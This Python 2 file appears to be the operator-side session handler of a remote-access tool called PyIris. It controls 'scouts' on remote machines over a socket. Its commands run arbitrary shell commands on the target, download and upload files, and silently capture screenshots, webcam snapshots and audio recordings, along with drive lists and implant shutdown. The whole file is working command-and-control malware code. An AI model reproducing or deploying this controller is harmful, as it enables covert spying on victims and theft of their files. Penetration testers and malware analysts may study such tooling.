import os
import socket
import time
import modules.cfg as cfg
import modules.show_banner as show_banner
import modules.clear_screen as clear_screen
import modules.cleanup_and_exit as cleanup_and_exit
import modules.recv_all as recv_all
import modules.find_basename as find_basename
import modules.execute_local_command as execute_local_command

cfg.global_variables()


def payload_handler(id):
    print cfg.pos + 'Bridged to scout of ID : ' + str(cfg.db_scouts[id][0])
    prompt_handler = '\x1b[1m\x1b[37mPyIris (\x1b[0m\x1b[1m\x1b[31m' + cfg.db_scouts[id][3] + '\x1b[0m\x1b[1m\x1b[37m@\x1b[0m\x1b[1m\x1b[31m' + cfg.db_scouts[id][1] + '\x1b[0m\x1b[1m\x1b[37m) > \x1b[0m'
    sock = cfg.db_scouts[id][5]
    while True:
        try:
            command_input = raw_input(prompt_handler).strip()
            option = command_input.split(' ',1)[0]
            if option == 'banner':
                show_banner.banner()
            elif option == 'clear':
                clear_screen.clear()
            elif option == 'local':
                try:
                    execute_local_command.execute(command_input.split(' ',1)[1])
                except IndexError:
                    print cfg.err + 'Specify a local system command to execute'
            elif option == 'python':
                try:
                    print cfg.note + 'Switching to python interpreter, exit() to exit\n'
                    os.system('python')
                except KeyboardInterrupt:
                    pass
            elif option == 'quit':
                cleanup_and_exit.cleanup()
            elif option == 'back':
                print cfg.pos + 'Returning...'
                return
            elif option == 'disconnect':
                sock.sendall(command_input + cfg.End)
                output = recv_all.recvall(sock)
                print output
                cfg.db_scouts.pop(id)
                break
            elif option == 'terminate':
                sock.sendall(command_input + cfg.End)
                output = recv_all.recvall(sock)
                print output
                cfg.db_scouts.pop(id)
                break
            elif option == 'sleep':
                sock.sendall(command_input + cfg.End)
                output = recv_all.recvall(sock)
                print output
                if '[*]' in output:
                    cfg.db_scouts.pop(id)
                    break
            elif option == 'download':
                sock.sendall(command_input + cfg.End)
                output = recv_all.recvall(sock)
                if '|/' in output:
                    output = output.rstrip(cfg.End).split('|/', 1)
                    f = open(find_basename.basename(output[0]), 'wb')
                    f.write(output[1])
                    f.close()
                    print cfg.pos + 'Downloaded file succesfully'
                else:
                    print output
            elif option in ('upload','transport_kill','transport'):
                try:
                    file_name = command_input.split(' ', 1)[1]
                except:
                    print cfg.err + 'Specify file to upload'
                    continue
                if os.path.isfile(file_name):
                    f = open(file_name, 'rb')
                    data = f.read()
                    f.close()
                    sock.sendall(command_input.split(' ',1)[0]+' '+file_name + '|/' + data + cfg.End)
                    output = recv_all.recvall(sock)
                    print output
                else:
                    print cfg.err + 'File path/name is not valid'
            elif option == 'valids':
                sock.sendall(command_input + cfg.End)
                output = recv_all.recvall(sock)
                if '|/' in output:
                    load_output = output.split('|/')
                    for i in load_output:
                        print cfg.note + i
            elif option == 'active':
                sock.sendall(command_input + cfg.End)
                output = recv_all.recvall(sock)
                if '|/' in output:
                    output = output.split('|/')
                    for i in output:
                        if not i:
                            continue
                        print cfg.pos + i
                else:
                    print output
            elif option == 'drives':
                sock.sendall(command_input + cfg.End)
                output = recv_all.recvall(sock)
                if '|/' in output:
                    output = output.split('|/')
                    for i in output:
                        print cfg.pos + i
                else:
                    print output
            elif option == 'screen':
                sock.sendall(command_input + cfg.End)
                output = recv_all.recvall(sock)
                if '|/' in output:
                    output = output.split('|/', 1)
                    f = open(find_basename.basename(output[0]), 'wb')
                    f.write(output[1])
                    f.close()
                    print cfg.pos + 'Downloaded scouts screenshot as : ' + find_basename.basename(output[0])
                else:
                    print output
            elif option == 'webcam':
                sock.sendall(command_input + cfg.End)
                output = recv_all.recvall(sock)
                if '|/' in output:
                    output = output.split('|/', 1)
                    f = open(find_basename.basename(output[0]), 'wb')
                    f.write(output[1])
                    f.close()
                    print cfg.pos + 'Downloaded scouts webcam snapshot as : ' + find_basename.basename(output[0])
                else:
                    print output
            elif option == 'rec_audio':
                sock.sendall(command_input + cfg.End)
                print cfg.pos + 'Recording, please be patient '
                output = recv_all.recvall(sock)
                if '|/' in output:
                    output = output.split('|/', 1)
                    f = open(find_basename.basename(output[0]), 'wb')
                    f.write(output[1])
                    f.close()
                    print cfg.pos + 'Downloaded scouts audio recording as : ' + find_basename.basename(output[0])
                else:
                    print output
            elif option == '':
                pass
            else:
                sock.sendall(command_input + cfg.End)
                output = recv_all.recvall(sock)
                print output
        except socket.error as e:
            print cfg.err + 'Socket error detected : ' + str(e)
            print cfg.err + 'Stopping current session...'
            cfg.db_scouts.pop(id)
            print cfg.note + 'Returning...'
            return
        except EOFError:
            time.sleep(2)
        except Exception as e:
            print cfg.err + 'Error : ' + str(e)
